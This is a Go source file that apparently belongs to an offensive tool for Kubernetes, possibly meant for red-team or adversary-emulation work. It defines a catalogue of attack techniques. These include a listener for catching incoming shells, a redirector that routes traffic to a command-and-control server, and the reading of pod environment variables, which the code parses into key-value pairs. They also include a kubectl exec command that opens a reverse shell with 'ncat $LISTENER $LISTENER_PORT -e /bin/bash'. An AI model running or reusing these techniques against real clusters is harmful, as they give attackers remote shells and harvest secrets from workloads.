package armory

import (
	"errors"
	"strings"

	"github.com/Magier/Ran/domain"
)

type ResultHandler = func(source domain.Entity, args ...any) (domain.Event, error)

type TTPMeta struct {
	Title, Description string
	ResultHandler      ResultHandler
}

func (meta TTPMeta) GetTitle() string {
	return meta.Title
}
func (meta TTPMeta) GetDescription() string {
	return meta.Description
}

func (meta TTPMeta) HandleResult(source domain.Entity, args ...any) (domain.Event, error) {
	if meta.ResultHandler == nil {
		return nil, nil
	}
	return meta.ResultHandler(source, args...)
}

type CreateListener struct {
	TTPMeta
	Port uint
}

func (c CreateListener) GetMessage() domain.Message {
	return domain.StartListener{Port: c.Port}
}

type CreateRedirector struct {
	TTPMeta
	DstPort uint
}

func (c CreateRedirector) GetMessage() domain.Message {
	return domain.StartC2Redirector{DstPort: c.DstPort}
}

type ReadEnvVars struct {
	TTPMeta
	TargetId        string
	Target          string
	TargetNamespace string
}

func (c ReadEnvVars) GetMessage() domain.Message {
	return domain.ReadEnvVars{
		Target: &domain.Target{
			Id:   c.TargetId,
			Name: c.Target,
			Ns:   c.TargetNamespace,
		},
	}
}

type KubectlExecCmd struct {
	TTPMeta
	Cmd string
}

func (c KubectlExecCmd) GetMessage() domain.Message {
	return &domain.ExecTTP{TTP: c, Cmd: c.Cmd, Target: &domain.Target{}, C2Channel: KubectlExecCmd{}}
}

type Armory struct {
}

func (a Armory) GetTTPs() []domain.TTP {
	return []domain.TTP{
		CreateListener{
			TTPMeta: TTPMeta{
				Title: "Create Listener", Description: "Catch incoming shells",
			},
			Port: 1337,
		},
		CreateRedirector{
			TTPMeta: TTPMeta{
				Title:       "Create Redirector",
				Description: "Create a proxy routing traffic to the C2",
			},
			DstPort: 1337,
		},
		ReadEnvVars{
			TTPMeta: TTPMeta{
				Title:         "Read Environment Variables",
				Description:   "Read environment variables from a target",
				ResultHandler: handleEnvVarResult,
			},
		},
		KubectlExecCmd{
			TTPMeta: TTPMeta{
				Title:         "Kubectl Exec Env",
				Description:   "Use kubectl exec to read environment variables of a pod",
				ResultHandler: handleEnvVarResult,
			},
			Cmd: "env",
		},
		KubectlExecCmd{
			TTPMeta: TTPMeta{
				Title:       "Kubectl Exec simple shell",
				Description: "Use kubectl exec to establish a simple shell",
			},
			Cmd: "ncat $LISTENER $LISTENER_PORT -e /bin/bash",
		},
	}
}

func LoadArmory() (Armory, error) {
	return Armory{}, nil
}

func handleEnvVarResult(source domain.Entity, args ...any) (domain.Event, error) {
	stderr := args[1].(string)
	if stderr != "" {
		return nil, errors.New(stderr)
	}

	stdout := args[0].(string)
	vars := make(map[string]string)
	for _, l := range strings.Split(stdout, "\n") {
		k, v, ok := strings.Cut(l, "=")
		if ok {
			vars[k] = v
		}
	}

	return domain.EnvVarsExtracted{
		Source: source,
		Vars:   vars,
	}, nil
}
